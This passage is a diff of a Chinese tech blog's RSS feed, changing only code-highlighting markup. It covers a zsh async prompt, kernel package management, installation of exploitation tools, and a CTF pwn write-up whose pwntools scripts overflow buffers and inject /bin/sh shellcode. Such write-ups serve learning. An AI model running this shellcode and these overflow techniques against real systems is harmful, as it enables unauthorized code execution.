-zstyle <span style="color:#e6db74">&#39;:vcs_info:(sv[nk]|bzr):*&#39;</span> branchformat <span style="color:#e6db74">&#39;%b|%F{cyan}%r%f&#39;</span>
-zstyle <span style="color:#e6db74">&#39;:vcs_info:git*+set-message:*&#39;</span> hooks git_status
-
-ASYNC_PROC<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
-ASYNC_DATA<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>TMPPREFIX<span style="color:#e6db74">}</span><span style="color:#e6db74">-prompt_sorin_data&#34;</span>
-<span style="color:#66d9ef">function</span> precmd<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
-
-    <span style="color:#66d9ef">function</span> async<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
-        vcs_info
-        <span style="color:#75715e"># save to temp file</span>
-        printf <span style="color:#e6db74">&#34;%s&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>vcs_info_msg_0_<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> &gt; $ASYNC_DATA
-        <span style="color:#75715e"># signal parent</span>
-        kill -s USR1 $$
-    <span style="color:#f92672">}</span>
-    <span style="color:#75715e"># do not clear RPROMPT, let it persist</span>
-    <span style="color:#75715e"># kill child if necessary</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>ASYNC_PROC<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
-        kill -s HUP $ASYNC_PROC &gt;/dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> :
-    <span style="color:#66d9ef">fi</span>
-    <span style="color:#75715e"># start background computation</span>
-    async &amp;!
-    ASYNC_PROC<span style="color:#f92672">=</span>$!
-<span style="color:#f92672">}</span>
-<span style="color:#66d9ef">function</span> TRAPUSR1<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
-    <span style="color:#75715e"># read from temp file</span>
-    RPROMPT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat $ASYNC_DATA<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
-    <span style="color:#75715e"># reset proc number</span>
-    ASYNC_PROC<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
-    <span style="color:#75715e"># redisplay</span>
-    zle <span style="color:#f92672">&amp;&amp;</span> zle reset-prompt
-<span style="color:#f92672">}</span>
-
-PROMPT<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;%F{cyan}%n@%m%f %F{green}%~%f # &#39;</span>
-RPROMPT<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
-</code></pre></div><p>References</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>setopt prompt_subst <span style="color:#75715e"># enable command substition in prompt</span>
+</span></span><span style="display:flex;"><span>autoload -Uz vcs_info
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> enable bzr git hg svn
+</span></span><span style="display:flex;"><span>zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> check-for-changes true
+</span></span><span style="display:flex;"><span>zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> stagedstr <span style="color:#e6db74">&#39;%F{green}●%f&#39;</span>
+</span></span><span style="display:flex;"><span>zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> unstagedstr <span style="color:#e6db74">&#39;%F{yellow}●%f&#39;</span>
+</span></span><span style="display:flex;"><span>zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> formats <span style="color:#e6db74">&#39;  %b%c%u&#39;</span>
+</span></span><span style="display:flex;"><span>zstyle <span style="color:#e6db74">&#39;:vcs_info:*&#39;</span> actionformats <span style="color:#e6db74">&#34; - [%b%c%u|%F{cyan}%a%f]&#34;</span>
+</span></span><span style="display:flex;"><span>zstyle <span style="color:#e6db74">&#39;:vcs_info:(sv[nk]|bzr):*&#39;</span> branchformat <span style="color:#e6db74">&#39;%b|%F{cyan}%r%f&#39;</span>
+</span></span><span style="display:flex;"><span>zstyle <span style="color:#e6db74">&#39;:vcs_info:git*+set-message:*&#39;</span> hooks git_status
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ASYNC_PROC<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>ASYNC_DATA<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>TMPPREFIX<span style="color:#e6db74">}</span><span style="color:#e6db74">-prompt_sorin_data&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> precmd<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> async<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        vcs_info
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># save to temp file</span>
+</span></span><span style="display:flex;"><span>        printf <span style="color:#e6db74">&#34;%s&#34;</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>vcs_info_msg_0_<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> &gt; $ASYNC_DATA
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># signal parent</span>
+</span></span><span style="display:flex;"><span>        kill -s USR1 $$
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># do not clear RPROMPT, let it persist</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># kill child if necessary</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>ASYNC_PROC<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        kill -s HUP $ASYNC_PROC &gt;/dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> :
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># start background computation</span>
+</span></span><span style="display:flex;"><span>    async &amp;!
+</span></span><span style="display:flex;"><span>    ASYNC_PROC<span style="color:#f92672">=</span>$!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> TRAPUSR1<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># read from temp file</span>
+</span></span><span style="display:flex;"><span>    RPROMPT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat $ASYNC_DATA<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># reset proc number</span>
+</span></span><span style="display:flex;"><span>    ASYNC_PROC<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># redisplay</span>
+</span></span><span style="display:flex;"><span>    zle <span style="color:#f92672">&amp;&amp;</span> zle reset-prompt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PROMPT<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;%F{cyan}%n@%m%f %F{green}%~%f # &#39;</span>
+</span></span><span style="display:flex;"><span>RPROMPT<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span></code></pre></div><p>References</p>
 <hr>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">http://www.anishathalye.com/2015/02/07/an-asynchronous-shell-prompt/
-https://linuxtoy.org/archives/zsh_per_dir_hist.html
-http://www.cnblogs.com/ma6174/archive/2012/05/08/2490921.html
-</code></pre></div>]]></content:encoded>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http://www.anishathalye.com/2015/02/07/an-asynchronous-shell-prompt/
+</span></span><span style="display:flex;"><span>https://linuxtoy.org/archives/zsh_per_dir_hist.html
+</span></span><span style="display:flex;"><span>http://www.cnblogs.com/ma6174/archive/2012/05/08/2490921.html
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -590,17 +590,17 @@ dpkg --get-selections | grep linux-image 移除舊kernel
 aptitude remove linux-image-3.19.0-18-generic linux kernel exploits db
 https://www.kernel-exploits.com/</description>
       <content:encoded><![CDATA[<p>搜尋</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">aptitude search linux-image-
-</code></pre></div><p>安裝</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">aptitude install linux-image-xxxx
-</code></pre></div><p>或是上網找尋deb檔下載安裝</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">wget http://kr.archive.ubuntu.com/ubuntu/pool/main/l/linux-lts-utopic/linux-image-3.16.0-30-generic_3.16.0-30.40~14.04.1_amd64.deb
-sudo dpkg -i *.deb
-</code></pre></div><p>查看kernel安裝紀錄</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">dpkg --get-selections | grep linux-image
-</code></pre></div><p>移除舊kernel</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">aptitude remove linux-image-3.19.0-18-generic
-</code></pre></div><p>linux kernel exploits db</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>aptitude search linux-image-
+</span></span></code></pre></div><p>安裝</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>aptitude install linux-image-xxxx
+</span></span></code></pre></div><p>或是上網找尋deb檔下載安裝</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wget http://kr.archive.ubuntu.com/ubuntu/pool/main/l/linux-lts-utopic/linux-image-3.16.0-30-generic_3.16.0-30.40~14.04.1_amd64.deb
+</span></span><span style="display:flex;"><span>sudo dpkg -i *.deb
+</span></span></code></pre></div><p>查看kernel安裝紀錄</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>dpkg --get-selections | grep linux-image
+</span></span></code></pre></div><p>移除舊kernel</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>aptitude remove linux-image-3.19.0-18-generic
+</span></span></code></pre></div><p>linux kernel exploits db</p>
 <p><a href="https://www.kernel-exploits.com/">https://www.kernel-exploits.com/</a></p>
 ]]></content:encoded>
     </item>
@@ -619,30 +619,30 @@ cp /usr/local/lib/python2.7/dist-packages/usr/lib/python2.7/dist-packages/capsto
 ncat sudo apt-get install netcat-traditional netcat-openbsd nmap </description>
       <content:encoded><![CDATA[<p>ub 14.04 x64</p>
 <h2 id="i32-lib">i32 lib</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">apt-get install gcc-multilib
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cd /etc/apt/sources.list.d
-echo <span style="color:#e6db74">&#34;deb http://old-releases.ubuntu.com/ubuntu/ raring main restricted universe multiverse&#34;</span> &gt;ia32-libs-raring.list
-apt-get update
-apt-get install ia32-libs
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">dpkg --add-architecture i386
-apt-get update
-apt-get install libssl-dev:i386
-</code></pre></div><h2 id="peda">PEDA</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">apt-get install nasm micro-inetd
-apt-get install libc6-dbg
-https://github.com/longld/peda
-</code></pre></div><h2 id="qira">qira</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apt-get install gcc-multilib
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /etc/apt/sources.list.d
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;deb http://old-releases.ubuntu.com/ubuntu/ raring main restricted universe multiverse&#34;</span> &gt;ia32-libs-raring.list
+</span></span><span style="display:flex;"><span>apt-get update
+</span></span><span style="display:flex;"><span>apt-get install ia32-libs
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>dpkg --add-architecture i386
+</span></span><span style="display:flex;"><span>apt-get update
+</span></span><span style="display:flex;"><span>apt-get install libssl-dev:i386
+</span></span></code></pre></div><h2 id="peda">PEDA</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>apt-get install nasm micro-inetd
+</span></span><span style="display:flex;"><span>apt-get install libc6-dbg
+</span></span><span style="display:flex;"><span>https://github.com/longld/peda
+</span></span></code></pre></div><h2 id="qira">qira</h2>
 <p><a href="https://github.com/BinaryAnalysisPlatform/qira">https://github.com/BinaryAnalysisPlatform/qira</a></p>
 <h2 id="pwntools">pwntools</h2>
 <p>包含checksec, ROPgadget Tools</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo pip install git+https://github.com/Gallopsled/pwntools#egg<span style="color:#f92672">=</span>pwntools
-</code></pre></div><p>fix bug</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">cp /usr/local/lib/python2.7/dist-packages/usr/lib/python2.7/dist-packages/capstone/libcapstone.so /usr/local/lib/python2.7/dist-packages/capstone/.
-</code></pre></div><h2 id="rp">rp++</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo pip install git+https://github.com/Gallopsled/pwntools#egg<span style="color:#f92672">=</span>pwntools
+</span></span></code></pre></div><p>fix bug</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>cp /usr/local/lib/python2.7/dist-packages/usr/lib/python2.7/dist-packages/capstone/libcapstone.so /usr/local/lib/python2.7/dist-packages/capstone/.
+</span></span></code></pre></div><h2 id="rp">rp++</h2>
 <p><a href="https://github.com/0vercl0k/rp/downloads">https://github.com/0vercl0k/rp/downloads</a></p>
 <h2 id="ncat">ncat</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt-get install netcat-traditional netcat-openbsd nmap
-</code></pre></div>]]></content:encoded>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt-get install netcat-traditional netcat-openbsd nmap
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -661,77 +661,77 @@ from pwn import * import time r = remote(&amp;#39;127.0.0.1&amp;#39;, 4000) read
       <content:encoded><![CDATA[<p>簡單紀錄一下</p>
 <h2 id="pwn1">PWN1</h2>
 <p>丟進ida 可以看到</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">if ( v4 == 0x90909090 )
-result = puts(aCensordCensord);
-else
-result = printf(&#34;Your point is only %d, try hard!\n&#34;, v4, v1,
-v2, v3);
-return result;
-</code></pre></div><p>直接塞90結束</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python -c &#39;print &#34;\x90&#34;*1000&#39; | nc 52.69.163.194 1111
-</code></pre></div><h2 id="pwn2">PWN2</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>if ( v4 == 0x90909090 )
+</span></span><span style="display:flex;"><span>result = puts(aCensordCensord);
+</span></span><span style="display:flex;"><span>else
+</span></span><span style="display:flex;"><span>result = printf(&#34;Your point is only %d, try hard!\n&#34;, v4, v1,
+</span></span><span style="display:flex;"><span>v2, v3);
+</span></span><span style="display:flex;"><span>return result;
+</span></span></code></pre></div><p>直接塞90結束</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python -c &#39;print &#34;\x90&#34;*1000&#39; | nc 52.69.163.194 1111
+</span></span></code></pre></div><h2 id="pwn2">PWN2</h2>
 <p>定位到地20個字以後可以控制eip</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb-peda$ info functions
-All defined functions:
-Non-debugging symbols:
-0x08048364  _init
-0x080483a0  read@plt
-</code></pre></div><p>可以指到<code>read</code>上,一般來說長這樣</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">call
-ret
-argv1
-￼argv2
-argv3
-</code></pre></div><p>可以控制<code>read</code>的返回地址跟參數,所以可以把<code>ret</code>跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> time
-r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#ae81ff">4000</span>)
-read_adr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa0\x83\x04\x08</span><span style="color:#e6db74">&#34;</span>
-read <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>
-p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> read_adr <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> read
-r<span style="color:#f92672">.</span>send (p)
-time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
-r<span style="color:#f92672">.</span>send (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd</span>
-\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68<span style="color:#e6db74">&#34;)</span>
-</code></pre></div><h2 id="pwn3">PWN3</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gdb-peda$ info functions
+</span></span><span style="display:flex;"><span>All defined functions:
+</span></span><span style="display:flex;"><span>Non-debugging symbols:
+</span></span><span style="display:flex;"><span>0x08048364  _init
+</span></span><span style="display:flex;"><span>0x080483a0  read@plt
+</span></span></code></pre></div><p>可以指到<code>read</code>上,一般來說長這樣</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>call
+</span></span><span style="display:flex;"><span>ret
+</span></span><span style="display:flex;"><span>argv1
+</span></span><span style="display:flex;"><span>￼argv2
+</span></span><span style="display:flex;"><span>argv3
+</span></span></code></pre></div><p>可以控制<code>read</code>的返回地址跟參數,所以可以把<code>ret</code>跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#ae81ff">4000</span>)
+</span></span><span style="display:flex;"><span>read_adr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa0\x83\x04\x08</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>read <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> read_adr <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> read
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send (p)
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd</span>
+</span></span><span style="display:flex;"><span>\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68<span style="color:#e6db74">&#34;)</span>
+</span></span></code></pre></div><h2 id="pwn3">PWN3</h2>
 <p>滿多東西始用 qira看的 pwn3首先可以一直<code>push</code>來達成覆蓋<code>ret</code>的效果最後要exit退出達成覆蓋
 一開始算一下 <code>pop leak</code> 的值跟我們shellcode 差多遠,計算以後差 36 ,但是會覆蓋 ret 所以ret 以後要給他一個指標 指向我們的shellcode
 ⽤用<code>%d</code>的話超過<code>0x80000000</code> 要剪掉 <code>0x100000000</code>塞進去的職才會是正常的 我們的payload預計長這樣</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">point to shellcode + shellcode + nop + ret
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> time
-r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>,<span style="color:#ae81ff">4000</span>)
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">push</span>(num):
-     r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-     time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)
-     <span style="color:#66d9ef">if</span> num <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x80000000</span>:
-           num <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x100000000</span>
-     r<span style="color:#f92672">.</span>send( str(num) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-<span style="color:#75715e">#pop leak</span>
-r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-item <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#39;item&#39;</span>)[<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">23</span>]
-shell_adr <span style="color:#f92672">=</span> int(item,<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
-<span style="color:#75715e">#shellcode point</span>
-push(shell_adr)
-<span style="color:#75715e">#shellcode</span>
-push(<span style="color:#ae81ff">0x315b0beb</span>)
-push(<span style="color:#ae81ff">0x31c931c0</span>)
-push(<span style="color:#ae81ff">0xcd0bb0d2</span>)
-push(<span style="color:#ae81ff">0xfff0e880</span>)
-push(<span style="color:#ae81ff">0x622fffff</span>)
-push(<span style="color:#ae81ff">0x732f6e69</span>)
-push(<span style="color:#ae81ff">0x90900068</span>)
-<span style="color:#75715e">#nop</span>
-<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>):
-     push(<span style="color:#ae81ff">0x90909090</span>)
-<span style="color:#75715e">#ret</span>
-push(shell_adr)
-<span style="color:#75715e">#exit</span>
-time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
-r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
-<span style="color:#75715e">#get shell</span>
-r<span style="color:#f92672">.</span>interactive()
-</code></pre></div>]]></content:encoded>
